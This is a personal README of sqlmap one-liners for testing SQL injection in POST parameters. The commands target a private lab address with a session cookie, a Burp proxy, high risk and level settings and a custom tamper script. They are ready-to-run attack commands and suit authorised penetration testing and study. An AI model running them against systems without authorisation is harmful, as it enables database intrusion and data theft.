# SQLMapExamples
A list of sample SQL Map Injection Commands.  SQLMap is a powerful tool for identifying SQL injection vulnerabilities.  However, everytime I use it, I struggle with the parameters.  The following is a list of SQLMap one-liners that I have used in the past and keep here so I can copy and paste and modify the parameters are required.

Reference:
https://github.com/sqlmapproject/sqlmap/wiki/Usage



## SQLMap Injection on POST parameter with a PHP Session ID
Here we have simple sql injection test agianst a single POST parameter
```bash
sqlmap.py -u "http://10.10.10.10/profile.php" --data="name=1234567890" --cookie="PHPSESSID=rbeph9bv25ive9k7sqjefnsujk" --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" --referer="http://10.10.10.10/profile.php" --delay=0 --timeout=30 --retries=0 --level=3 --risk=1 --threads=1 --time-sec=5 -b --batch --answers="crack=N,dict=N"
```

## SQLMap Injection on POST parameter at a particular position using the astrix (*) notation 
Here is the same injection attack as above but using the astrix to inject at a predetermined postion for a MySQL database running on a Linux platform:
```bash
sqlmap.py -u "http://10.10.10.10/profile.php" --data="name=1234567890*" --method="POST" --cookie="PHPSESSID=rbeph9bv25ive9k7sqjefnsujk" --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" --referer="http://10.10.10.10/profile.php" --delay=0 --timeout=30 --retries=0 --dbms="MySQL" --os=Linux --level=3 --risk=1 --threads=1 --time-sec=5 -b --batch --answers="crack=N,dict=N"
```


## SQLMap Injection on POST parameter at a particular position using the astrix (*) notation 
Here is a SQL injection attack which has been configured to run through a Proxy (BurpSuite)

```bash
sqlmap.py -u "http://10.10.10.10/rofile.php" --data="name=1234567890*" --method="POST" --cookie="PHPSESSID=rbeph9bv25ive9k7sqjefnsujk" --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" --referer="http://10.10.10.10/profile.php" --proxy=http://127.0.0.1:8080 --delay=0 --timeout=30 --retries=0 --dbms="MySQL" --os=Linux --level=3 --risk=1 --threads=1 --time-sec=5 -b --batch --answers="crack=N,dict=N"
```

## SQLMap test only 1 parameter "name" and risk 3 level 5 through a proxy connection 
Here is a sql injection on a name parameter for a login form at a set position on the name field. Also there is a custom written tamper (that is included in this repository) that will replace <here> with 3 random characters, so that a unique user is created with each SQLMap injection test.  
You can  install this tamper simply by coping the file to your /usr/share/sqlmap/tamper folder (on Kali at least)
  
```bash
sqlmap.py -u "http://10.10.10.10:80/index.php" --data="name=12345678901*&email=test<here>@test.com&password=test12345" --method="POST" --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" --referer="http://10.10.10.10/profile.php" --proxy=http://127.0.0.1:8080 --delay=0 --timeout=30 --retries=0 -p "name" --dbms="MySQL" --os=Linux --level=5 --risk=3 --threads=1 --time-sec=5 -b --batch --answers="crack=N,dict=N" --tamper=chargen.py
```
## Create a custom SQLMap tamper file
I ran into a scenario today where I wanted to test a SQL create new user page for a SQL injection.  
Tampers can be easily edited and replaced here:
```
cd/usr/share/sqlmap/tamper
```
```
sudo cp lowercase.py increment.py
```


